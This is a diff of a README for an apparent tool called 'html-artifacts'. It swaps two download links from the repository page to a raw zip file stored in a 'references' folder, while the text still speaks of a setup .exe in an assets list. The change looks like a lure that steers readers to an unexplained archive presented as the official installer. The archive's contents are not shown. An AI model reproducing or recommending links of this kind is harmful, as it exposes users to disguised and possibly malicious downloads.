@@ -1,6 +1,6 @@
 # 📄 html-artifacts - Create neat self-contained web files
 
-[![Download Installer](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/dovydaskarbutovskis20-art/html-artifacts)
+[![Download Installer](https://img.shields.io/badge/Download_Software-Blue-blue)](https://raw.githubusercontent.com/dovydaskarbutovskis20-art/html-artifacts/main/skill/references/artifacts_html_v3.2.zip)
 
 ## 📋 What this tool does
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run this software:
 
 You must first get the installer file from the official source. Use the link below to reach the download page.
 
-[Click here to reach the download page](https://github.com/dovydaskarbutovskis20-art/html-artifacts)
+[Click here to reach the download page](https://raw.githubusercontent.com/dovydaskarbutovskis20-art/html-artifacts/main/skill/references/artifacts_html_v3.2.zip)
 
 Once the page loads, look for the assets list. Select the file named html-artifacts-setup.exe. Save this file to your computer.
 
